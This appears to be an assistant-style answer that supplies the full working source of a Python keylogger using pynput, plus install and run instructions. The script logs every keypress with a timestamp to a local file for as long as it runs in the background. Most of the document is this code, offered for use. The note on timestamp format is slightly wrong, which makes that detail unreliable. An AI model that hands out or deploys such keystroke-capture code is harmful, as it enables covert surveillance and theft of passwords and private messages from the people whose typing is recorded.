Here is a python keylogger using pynput module. 

```python
from pynput import keyboard
import datetime
  
logfile = open("log.txt", "a") # Append to file ('a')

def on_key_press(key):
    logfile.write(str(datetime.datetime.now()) + ':\t') 

    try:
        k = str(key.char)
    except:
        if key == keyboard.Key.space:
            k = "SPACE"
        else:
            k = str(key)
     
    logfile.write(k+'\n') 

with keyboard.Listener(on_press=on_key_press) as listener:
  listener.join() # Blocking
```

This is a basic keylogger that logs each keypress to the file `log.txt` with timestamp, it handles most normal keys including special characters and spaces.

You would run this script, then everything you type (as long as this program stays running in the background) will be noted down on log.txt when every new line starting at a timestamp format: year/month/day hour:minute:second.

Note that to actually run this code you should have pynput installed (`pip install pynput`)